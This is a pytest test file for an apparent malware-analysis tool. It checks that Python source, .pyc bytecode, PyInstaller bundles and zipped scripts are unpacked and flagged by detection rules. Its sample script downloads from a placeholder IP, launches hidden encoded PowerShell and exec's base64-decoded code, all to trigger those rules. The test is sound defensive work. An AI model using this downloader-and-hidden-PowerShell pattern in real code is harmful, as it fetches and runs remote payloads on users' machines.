"""Python (.py/.pyc) engine, the PyInstaller unpacker, and their wiring through
the case pipeline and the nested path."""

from __future__ import annotations

import marshal
import struct
import sys
import time
import zipfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from docutracex.app import create_app
from docutracex.config import settings
from docutracex.parsers import pyinstaller, python, script_rules

ROOT = Path(__file__).resolve().parent.parent

_SRC = (
    "import base64, os, subprocess, urllib.request\n"
    "def run():\n"
    "    d = urllib.request.urlopen('http://198.51.100.9/s.bin').read()\n"
    "    subprocess.Popen('powershell -w hidden -enc QQ==', shell=True)\n"
    "    exec(base64.b64decode('cHJpbnQoMSk='))\n"
    "run()\n"
)


@pytest.fixture()
def env(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    return tmp_path


@pytest.fixture()
def client(env) -> TestClient:
    return TestClient(create_app())


def _wait(client, cid):
    for _ in range(1200):
        if client.get(f"/api/cases/{cid}").json().get("state") in ("completed", "error"):
            return
        time.sleep(0.05)


def _pyc(src: str) -> bytes:
    import importlib.util
    return importlib.util.MAGIC_NUMBER + b"\x00" * 12 + marshal.dumps(compile(src, "m.py", "exec"))


def _pyinstaller_exe(src: str) -> bytes:
    data = marshal.dumps(compile(src, "m.py", "exec"))
    name = b"main"
    toc = struct.pack(">IIIIB", 18 + len(name), 0, len(data), len(data), 0) + b"s" + name
    pyvers = sys.version_info.major * 100 + sys.version_info.minor
    pylib = f"python{sys.version_info.major}{sys.version_info.minor}.dll".encode().ljust(64, b"\x00")
    pkg = data + toc + pyinstaller.MAGIC + struct.pack(">IIII", len(data) + len(toc) + 88,
                                                       len(data), len(toc), pyvers) + pylib
    return b"MZ\x90\x00" + b"\x00" * 120 + b"PE\x00\x00" + b"\x00" * 64 + pkg


# --- rules -------------------------------------------------------------------
def test_python_rules_fire() -> None:
    hits = {h["rule"] for h in script_rules.scan(_SRC, script_rules.PY)}
    assert {"py_download", "py_subprocess", "py_lolbin", "py_exec", "py_b64"} <= hits


def test_python_lang_has_rules() -> None:
    assert len(script_rules.rules_for(script_rules.PY)) >= 15


# --- .py / .pyc parser -------------------------------------------------------
def test_py_source(tmp_path: Path) -> None:
    (tmp_path / "d.py").write_text(_SRC)
    r = python.analyze(tmp_path / "d.py", tmp_path / "none")
    sc = r["scripts"][0]
    assert sc["source"] == "source"
    rules = {f["rule"] for f in r["findings"]}
    assert {"py_download", "py_subprocess", "script_attack_chain"} <= rules


def test_pyc_disassembled(tmp_path: Path) -> None:
    (tmp_path / "d.pyc").write_bytes(_pyc(_SRC))
    r = python.analyze(tmp_path / "d.pyc", tmp_path / "none")
    sc = r["scripts"][0]
    assert sc["source"] in ("disassembled", "decompiled")
    assert sc["python_version"].startswith("3.")
    assert "py_download" in {f["rule"] for f in r["findings"]}


def test_pyc_incomplete_decompile_still_detects(tmp_path: Path, monkeypatch) -> None:
    # pycdc lags new CPython and often emits only imports/globals with
    # "Decompyle incomplete"; the body detections must still come from the
    # bytecode reconstruction.
    (tmp_path / "d.pyc").write_bytes(_pyc(_SRC))
    monkeypatch.setattr(python, "_decompile", lambda path: (
        "# Source Generated with Decompyle++\nimport subprocess\n"
        "import urllib.request as urllib\n# WARNING: Decompyle incomplete\n"))
    r = python.analyze(tmp_path / "d.pyc", tmp_path / "none")
    sc = r["scripts"][0]
    # The partial source is shown AND the bytecode-recovered calls are appended,
    # so the findings' line numbers map to the displayed code.
    assert sc["source"] == "decompiled + bytecode"
    assert "Decompyle incomplete" in sc["code"] and "recovered from the bytecode" in sc["code"]
    rules = {f["rule"] for f in r["findings"]}
    assert {"py_subprocess", "py_download"} <= rules
    # every finding's line number points at a real line of the displayed code
    lines = sc["code"].split("\n")
    for h in sc["hits"]:
        assert 1 <= h["line_no"] <= len(lines)


def test_py_light_deob(tmp_path: Path) -> None:
    src = "import base64\nexec(base64.b64decode('cHJpbnQoImhpIik='))\n"
    (tmp_path / "e.py").write_text(src)
    sc = python.analyze(tmp_path / "e.py", tmp_path / "none")["scripts"][0]
    assert sc["code_is_deobfuscated"] and 'print("hi")' in sc["code"]


# --- PyInstaller -------------------------------------------------------------
def test_pyinstaller_extract(tmp_path: Path) -> None:
    exe = tmp_path / "app.exe"
    exe.write_bytes(_pyinstaller_exe(_SRC))
    r = pyinstaller.extract(exe, tmp_path / "out")
    assert r["is_pyinstaller"] and r["python_version"].startswith("3.")
    assert any(n.endswith(".pyc") for _, n in r["_files"])
    assert any(f["rule"] == "pyinstaller_bundle" for f in r["findings"])


def test_not_pyinstaller(tmp_path: Path) -> None:
    exe = tmp_path / "plain.exe"
    exe.write_bytes(b"MZ\x90\x00" + b"\x00" * 200)
    assert pyinstaller.extract(exe, tmp_path / "out")["is_pyinstaller"] is False


# --- end-to-end --------------------------------------------------------------
def test_case_py(client: TestClient) -> None:
    cid = client.post("/api/cases", files={"file": ("d.py", _SRC.encode())}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert "python" in comp["modules"]
    assert "py_subprocess" in {f["rule"] for f in comp["findings"]}


def test_case_pyc(client: TestClient) -> None:
    cid = client.post("/api/cases", files={"file": ("d.pyc", _pyc(_SRC))}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert "python" in comp["modules"]
    assert comp["modules"]["python"]["scripts"][0]["source"] in ("disassembled", "decompiled")


def test_case_pyinstaller_exe(client: TestClient) -> None:
    cid = client.post("/api/cases", files={"file": ("app.exe", _pyinstaller_exe(_SRC))}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert comp["modules"]["pyinstaller"]["is_pyinstaller"]
    # The recovered Python is analysed (flat Python tab) and in the nested tree.
    assert "python" in comp["modules"] and "nested" in comp["modules"]
    rules = {f["rule"] for f in comp["findings"]}
    assert "pyinstaller_bundle" in rules and "py_download" in rules
    # PE keeps its generic file record too.
    assert comp["modules"]["file"]["hashes"]["sha256"]


def test_nested_python_in_zip(client: TestClient, tmp_path: Path) -> None:
    buf = tmp_path / "b.zip"
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("x.py", _SRC)
        zf.writestr("y.pyc", _pyc(_SRC))
    cid = client.post("/api/cases", files={"file": ("b.zip", buf.read_bytes())}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert "nested" in comp["modules"]
    assert "py_subprocess" in {f["rule"] for f in comp["findings"]}
